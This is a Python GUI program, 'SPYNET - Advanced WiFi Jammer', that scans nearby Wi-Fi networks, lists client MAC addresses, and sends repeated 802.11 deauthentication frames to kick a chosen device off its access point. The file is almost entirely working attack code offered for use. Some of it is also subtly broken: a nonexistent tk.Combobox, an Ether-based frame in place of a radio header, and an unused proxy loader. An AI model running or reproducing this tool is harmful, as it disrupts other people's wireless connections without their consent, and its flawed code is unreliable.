import tkinter as tk
from tkinter import messagebox, filedialog, scrolledtext
import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Deauth
import threading
import random
import requests
import time


root = tk.Tk()
root.title("SPYNET - Advanced WiFi Jammer")
root.geometry("800x600")
root.config(bg="#222222")


target_networks = []
target_clients = []
proxy_list = []


def load_proxies():
    global proxy_list
    file_path = filedialog.askopenfilename(title="Select Proxy List", filetypes=[("Text Files", "*.txt")])
    try:
        with open(file_path, "r") as file:
            proxy_list = file.readlines()
        messagebox.showinfo("Success", "Proxy list loaded successfully!")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to load proxy list: {e}")


def scan_networks(iface):
    global target_networks
    target_networks = []
    status_text.insert(tk.END, "\nScanning for nearby WiFi networks...\n")
    status_text.yview(tk.END)
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8: 
            ssid = pkt.info.decode() if pkt.info else "(hidden)"
            mac_address = pkt.addr3 
            if mac_address not in [network["mac"] for network in target_networks]:
                target_networks.append({"ssid": ssid, "mac": mac_address})
                status_text.insert(tk.END, f"Found Network: {ssid} ({mac_address})\n")
                status_text.yview(tk.END)

    scapy.sniff(iface=iface, prn=packet_handler, timeout=10)
    
    if not target_networks:
        messagebox.showerror("Error", "No networks found. Please ensure your device is in monitor mode.")
        return
    
   
    network_dropdown["values"] = [network["ssid"] for network in target_networks]
    network_dropdown.current(0)


def scan_clients(iface):
    global target_clients
    target_clients = []
    selected_network = network_dropdown.get()
    
   
    ap_mac = next((network["mac"] for network in target_networks if network["ssid"] == selected_network), None)
    if not ap_mac:
        messagebox.showerror("Error", "Selected network not found!")
        return

    status_text.insert(tk.END, f"\nScanning devices connected to {selected_network}...\n")
    status_text.yview(tk.END)
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 0 and pkt.subtype == 4:
                device_mac = pkt.addr2  
                if device_mac not in [client["mac"] for client in target_clients]:
                    target_clients.append({"mac": device_mac, "ap_mac": ap_mac})
                    status_text.insert(tk.END, f"Found Device: {device_mac} connected to AP {ap_mac}\n")
                    status_text.yview(tk.END)

    scapy.sniff(iface=iface, prn=packet_handler, timeout=10)
    
    if not target_clients:
        messagebox.showinfo("Info", "No devices found for the selected network.")
        return
    
    
    client_dropdown["values"] = [client["mac"] for client in target_clients]
    client_dropdown.current(0)


def send_deauth_packet(target_mac, ap_mac, iface):
    pkt = scapy.Ether(dst=target_mac) / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    scapy.sendp(pkt, iface=iface, verbose=False)
    status_text.insert(tk.END, f"Deauthentication packet sent to {target_mac} from {ap_mac}\n")
    status_text.yview(tk.END)


def start_attack():
    if not target_clients:
        messagebox.showerror("Error", "No clients found to attack.")
        return
    
    target_mac = client_dropdown.get()
    selected_network = network_dropdown.get()
    
  
    ap_mac = next((network["mac"] for network in target_networks if network["ssid"] == selected_network), None)
    
    if not ap_mac:
        messagebox.showerror("Error", "AP MAC address not found.")
        return
    

    threading.Thread(target=perform_attack, args=(target_mac, ap_mac, iface_entry.get())).start()


def perform_attack(target_mac, ap_mac, iface):
    status_text.insert(tk.END, f"\nStarting attack on {target_mac} connected to AP {ap_mac}...\n")
    status_text.yview(tk.END)
    
    for _ in range(10):  
        send_deauth_packet(target_mac, ap_mac, iface)
        time.sleep(1)

    status_text.insert(tk.END, f"\nAttack finished on {target_mac}.\n")
    status_text.yview(tk.END)

# GUI Layout
target_network_label = tk.Label(root, text="Select Target Network (SSID):", bg="#222222", fg="#ffffff")
target_network_label.pack(pady=10)

network_dropdown = tk.Combobox(root, width=40)
network_dropdown.pack(pady=5)

scan_network_button = tk.Button(root, text="Scan Networks", command=lambda: scan_networks(iface_entry.get()))
scan_network_button.pack(pady=10)

scan_clients_button = tk.Button(root, text="Scan Connected Devices", command=lambda: scan_clients(iface_entry.get()))
scan_clients_button.pack(pady=10)

target_device_label = tk.Label(root, text="Select Target Device (MAC):", bg="#222222", fg="#ffffff")
target_device_label.pack(pady=10)

client_dropdown = tk.Combobox(root, width=40)
client_dropdown.pack(pady=5)

iface_label = tk.Label(root, text="Enter Monitor Mode Interface (e.g., wlan0mon):", bg="#222222", fg="#ffffff")
iface_label.pack(pady=10)
iface_entry = tk.Entry(root, width=40)
iface_entry.pack(pady=5)

start_attack_button = tk.Button(root, text="Start Attack", command=start_attack)
start_attack_button.pack(pady=20)


status_label = tk.Label(root, text="Attack Status", bg="#222222", fg="#ffffff")
status_label.pack(pady=10)

status_text = scrolledtext.ScrolledText(root, height=10, width=80, wrap=tk.WORD, bg="#333333", fg="#ffffff")
status_text.pack(pady=10)


load_proxies_button = tk.Button(root, text="Load Proxy List", command=load_proxies)
load_proxies_button.pack(pady=20)


root.mainloop()
